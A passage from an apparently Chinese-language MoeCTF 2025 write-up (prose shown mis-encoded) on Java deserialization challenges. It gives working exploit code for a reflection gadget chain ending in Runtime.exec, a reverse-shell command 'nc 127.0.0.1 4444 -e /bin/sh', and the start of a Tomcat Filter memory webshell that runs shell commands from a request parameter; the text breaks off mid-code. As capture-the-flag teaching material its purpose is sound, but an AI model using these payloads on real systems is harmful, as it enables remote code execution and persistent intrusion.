class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥<code>hash()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯¹é”®è°ƒç”¨äº†<code>hashCode()</code>ï¼Œæ„é€ ä¸€ä¸ªmapæŠŠä¸€ä¸ª<code>Dog</code>ä½œä¸ºé”®ï¼Œä¹‹åå†é€šè¿‡åå°„è°ƒç”¨<code>DogService</code>çš„<code>chainWagTail()</code>æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œé“¾å°±å®Œæ•´äº†</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">   -&gt;HashMap.hash()</span><br><span class="line">       -&gt;example.demo.Dog.Dog.hashCode()</span><br><span class="line">       -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">           -&gt;method.invoke()</span><br><span class="line">               -&gt;example.demo.Dog.DogService.chainWagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">                   dog1.Object -&gt; input = (Class) java.lang.Runtime</span><br><span class="line">                   dog2.wagtail(Runtime.class, &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Method) java.lang.Runtime.getRuntime()</span><br><span class="line">                   dog3.wagtail(java.lang.Runtime.getRuntime(), &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Runtime) Runtime</span><br><span class="line">                   dog4.wagTail(Runtime, &quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) -&gt; input = (ProcessImpl) Command executed</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå°±æ˜¯è¦æ„é€ ä¸€ä¸ªDogServiceï¼Œæ§åˆ¶å…¶dogså­—æ®µæ–¹ä¾¿æˆ‘ä»¬é“¾å¼è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDogFields(Runtime.class,<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>, <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Integer, Dog&gt; map =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="number">1</span>,dog1);</span><br><span class="line">map.put(<span class="number">2</span>,dog2);</span><br><span class="line">map.put(<span class="number">3</span>,dog3);</span><br><span class="line"></span><br><span class="line"><span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">Class&lt;?&gt; clazz = DogService.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">dogs</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;dogs&quot;</span>);</span><br><span class="line">dogs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">dogs.set(dogService, map);</span><br></pre></td></tr></table></figure><p>å™¢ï¼Œè¿˜è¦å°è£…å‡ºæ¥ä¸€ä¸ªæ–¹æ³•æ–¹ä¾¿æˆ‘ä»¬ä¿®æ”¹å­—æ®µ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bread&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = dog.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">objectField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objectField.set(dog,object);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodField.set(dog,methodName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">paramTypesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;paramTypes&quot;</span>);</span><br><span class="line">        paramTypesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        paramTypesField.set(dog,paramTypes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">argsField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;args&quot;</span>);</span><br><span class="line">        argsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        argsField.set(dog,args);</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ„é€ ä¸€ä¸ª<code>dog4</code>ï¼Œè®©å®ƒå»è°ƒç”¨å‰é¢<code>dogService</code>çš„<code>chainWagTail()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> setDogFields(dogService,<span class="string">&quot;chainWagTail&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">Map &lt;Dog, Integer&gt; invokeMap =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">invokeMap.put(dog4,<span class="number">114514</span>);</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨<code>HashSet</code>ï¼Œå› ä¸º<code>HashSet</code>çš„<code>readObject()</code>è°ƒç”¨äº†<code>HashMap</code>çš„<code>put()</code>ï¼Œè€Œ<code>put()</code>åˆè°ƒç”¨äº†<code>hashCode()</code>ï¼Œè¿™ä¹ˆåšçš„ä¼˜ç‚¹æ˜¯<code>Set</code>æ¥å£æ˜¯<code>Collection</code>çš„å­æ¥å£ï¼Œä¼ è¿›å»çš„æ—¶å€™ä¸ä¼šæŠ¥è½¬å‹é”™è¯¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;Dog&gt; invokeSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">invokeSet.add(dog4);</span><br></pre></td></tr></table></figure><p>æ„é€ å®Œæ¯•ï¼Œå…¨é“¾å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.Dog;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    HashMap.readObject()</span></span><br><span class="line"><span class="comment">    -&gt;HashMap.hash()</span></span><br><span class="line"><span class="comment">        -&gt;example.demo.Dog.Dog.hashCode()</span></span><br><span class="line"><span class="comment">        -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">            -&gt;method.invoke()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.DogService.chainWagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                    dog1.Object -&gt; input = (Class) java.lang.Runtime</span></span><br><span class="line"><span class="comment">                    dog1.wagtail(Runtime.class, &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Method) java.lang.Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                    dog2.wagtail(java.lang.Runtime.getRuntime(), &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Runtime) Runtime</span></span><br><span class="line"><span class="comment">                    dog3.wagTail(Runtime, &quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;nc 127.0.0.1 4444 -e /bin/sh&quot;&#125;) -&gt; input = (ProcessImpl) Command executed</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable,Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDogFields(Runtime.class,<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>, <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        Dog dog3 = setDogFields(null,&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;nc 127.0.0.1 4444 -e /bin/sh&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Dog&gt; map =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">1</span>,dog1);</span><br><span class="line">        map.put(<span class="number">2</span>,dog2);</span><br><span class="line">        map.put(<span class="number">3</span>,dog3);</span><br><span class="line"></span><br><span class="line">        <span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">        Class&lt;?&gt; clazz = DogService.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dogs</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;dogs&quot;</span>);</span><br><span class="line">        dogs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dogs.set(dogService, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> setDogFields(dogService,<span class="string">&quot;chainWagTail&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Map &lt;Dog, Integer&gt; invokeMap =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        invokeMap.put(dog4,<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">        serialize(invokeMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bread&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = dog.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">objectField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objectField.set(dog,object);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodField.set(dog,methodName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">paramTypesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;paramTypes&quot;</span>);</span><br><span class="line">        paramTypesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        paramTypesField.set(dog,paramTypes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">argsField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;args&quot;</span>);</span><br><span class="line">        argsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        argsField.set(dog,args);</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">        System.out.println(base64Encoded);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;moeSerial.txt&quot;</span>), base64Encoded.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œåšè¿™ç§Javaååºåˆ—åŒ–é¢˜ç›®å°½é‡è®©åŒ…åç¯å¢ƒå’Œé¢˜ç›®ç¯å¢ƒä¸€æ ·ï¼Œæ­¤å¤–è¿˜è¦ä¿è¯<code>SerializeID</code>ç›¸åŒï¼Œå°±æ­¤é¢˜è€Œè¨€ï¼Œè¿˜éœ€åœ¨<code>DogService</code>ç±»åŠ ä¸Š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">988523103989629987L</span>;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç»™äº†è·³æ¿æœºï¼Œæ‰§è¡Œåå¼¹shellå‘½ä»¤<code>nc 127.0.0.1 4444 -e /bin/sh</code>ï¼Œç›‘å¬<code>4444</code>ç«¯å£ï¼Œæœ€ååœ¨ç¯å¢ƒå˜é‡çœ‹åˆ°äº†flag</p><p><img src="/img/post/96a84f43fa3efccab055a29a1ea5d7d8.png" alt="96a84f43fa3efccab055a29a1ea5d7d8"></p><br/><h1 id="MoeCTF-2025-é™„åŠ æŒ‘æˆ˜"><a href="#MoeCTF-2025-é™„åŠ æŒ‘æˆ˜" class="headerlink" title="[MoeCTF 2025]é™„åŠ æŒ‘æˆ˜"></a>[MoeCTF 2025]é™„åŠ æŒ‘æˆ˜</h1><p>æœ¬é¢˜ä¸º<code>ç¬¬äºŒåä¸‰ç«  å¹»å¢ƒè¿·å¿ƒÂ·çš‡é™¨æ˜Ÿæ²‰(å¤§ç»“å±€)</code>çš„é™„åŠ é¢˜ï¼Œè¿™ä¸€é¢˜å¹³å°ä¸å†æä¾›è·³æ¿æœºç”¨äºåå¼¹shellï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ³¨å…¥å†…å­˜é©¬å›æ˜¾ï¼Œå¯¹é™„ä»¶è§£åŒ…å¯ä»¥å‘ç°é¢˜ç›®ç¯å¢ƒæ˜¯SpringBootï¼Œå®˜æ–¹Wpæ›¾å°è¯•ä½¿ç”¨åŠ¨æ€ç¼–è¯‘æ³¨å…¥Interceptoræ‹¦æˆªå™¨å†…å­˜é©¬ï¼Œä½†æ˜¯è¯¥æ–¹å¼è¿‡äºå¤æ‚ï¼Œæˆ‘æƒ³åˆ°SpringBootå…¶å®å†…åµŒäº†ä¸€ä¸ªTomcatæœåŠ¡å™¨ï¼Œä¾¿æƒ³ç€æ³¨å…¥ä¸€ä¸ªFilterå†…å­˜é©¬</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆï¼Œç”±å‰é¢çš„é¢˜ç›®å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>HashSet</code>çš„<code>readObject()</code>æ–¹æ³•è§¦å‘<code>Dog</code>çš„<code>hashCode()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ä¸€æ¬¡<code>wagTail()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶<code>Dog</code>çš„å±æ€§åˆ©ç”¨<code>wagTail()</code>æ–¹æ³•è¿›è¡Œä¸€æ¬¡ä»»æ„å‘½ä»¤æ‰§è¡Œ</p><p>è·Ÿè¿‡CCé“¾å°±ä¼šçŸ¥é“ï¼Œé€šè¿‡<code>TemplatesImpl</code>ç±»çš„<code>newTransformer()</code>æ–¹æ³•å¯ä»¥è¿›è¡Œä¸€æ¬¡åŠ¨æ€ç±»åŠ è½½ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•åˆ©ç”¨è¿™ä¸€æ€è·¯æ³¨å…¥ï¼Œé—®é¢˜æ˜¯æ³¨å…¥ä¸€ä¸ªä»€ä¹ˆç±»ï¼Ÿåœ¨è¯¥ç±»è¢«åŠ è½½æ—¶ï¼Œéœ€è¦è‡ªåŠ¨è·å–<code>StandardContext</code>ï¼Œå¹¶å°†æ¶æ„FilteråŠ è½½å‡ºæ¥å¹¶æ³¨å†Œè¿›å»</p><p>æ‰€ä»¥å°±æœ‰äº†å¤§ä½“æ€è·¯ï¼šæ„å»ºæ¶æ„Filter-&gt;è·å–<code>StandardContext</code>å¹¶æ³¨å†Œå†…å­˜é©¬-&gt;å°†ä¸Šæ­¥çš„é€»è¾‘å†™å…¥è¢«<code>newTransformer()</code>æ–¹æ³•åŠ è½½çš„ç±»çš„é™æ€ä»£ç å—-&gt;é€šè¿‡<code>newTransformer()</code>åŠ è½½æ¶æ„ç±»</p><h2 id="æ„å»ºExp"><a href="#æ„å»ºExp" class="headerlink" title="æ„å»ºExp"></a>æ„å»ºExp</h2><p>é¦–å…ˆæ˜¯Filterå†…å­˜é©¬ï¼Œè¿™ä¸€æ­¥ä¸æ‰€æœ‰æ³¨å…¥Filterå†…å­˜é©¬çš„è¿‡ç¨‹å‡ ä¹ä¸€æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            ProcessBuilder processBuilder;</span><br><span class="line">            processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(output);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯æ„å»ºæ¶æ„è¢«åŠ è½½ç±»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è¯¥ç±»çš„é™æ€ä»£ç å—æ‰§è¡Œè¿‡ç¨‹ä¸­è·å–<code>ShellFilter</code>å®ä¾‹ï¼Œå¯ä»¥å…ˆæŠŠ<code>ShellFilter</code>è½¬æ¢ä¸ºå­—èŠ‚ç ä¿å­˜åœ¨é™æ€ä»£ç å—é€»è¾‘ä¸­ï¼Œåœ¨æ‰§è¡Œæ—¶å†åŠ è½½è·å–å®ä¾‹ï¼Œä¸‹é¢æ˜¯å¯¼å‡º<code>ShellFilter</code>å­—èŠ‚ç çš„é€»è¾‘</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dump</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.example.demo.Dog.ShellFIlter&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–å­—èŠ‚ç åï¼Œå¼€å§‹æ„å»ºæ¶æ„è¢«åŠ è½½ç±»ï¼Œé¦–å…ˆæ˜¯è¦è·å–<code>StandardContext</code>ï¼Œåœ¨SpringBootè·å–<code>StandardContext</code>ä¸çº¯Tomcatç¯å¢ƒç•¥æœ‰ä¸åŒï¼ŒSpring Boot å¹¶æ²¡æœ‰ç›´æ¥æš´éœ² Tomcat çš„åŸç”Ÿå¯¹è±¡ï¼Œè€Œæ˜¯å°†å…¶è¿›è¡Œäº†å¤šå±‚æ¬¡çš„å°è£…ï¼Œè¿™æœ¬è´¨æ˜¯ä¸€ä¸ªæŠ½ä¸å‰¥èŒ§çš„è¿‡ç¨‹ï¼Œæˆ‘æ„Ÿè§‰AIè®²çš„æ¯”æˆ‘æ›´å¥½å°±ç›´æ¥æ¬ä¸Šæ¥ç½¢</p><p><img src="/img/post/image-20260120142506438.png" alt="image-20260120142506438"></p><p>å…·ä½“åæ˜ åˆ°ä»£ç ä¸Šå°±æ˜¯ä»¥ä¸‹çš„è¿‡ç¨‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; contextHolderClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRequestAttributesMethod</span> <span class="operator">=</span> contextHolderClass.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">attributes</span> <span class="operator">=</span> getRequestAttributesMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; requestAttributesClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRequestMethod</span> <span class="operator">=</span> requestAttributesClass.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line"><span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest) getRequestMethod.invoke(attributes);</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">applicationContext</span> <span class="operator">=</span> 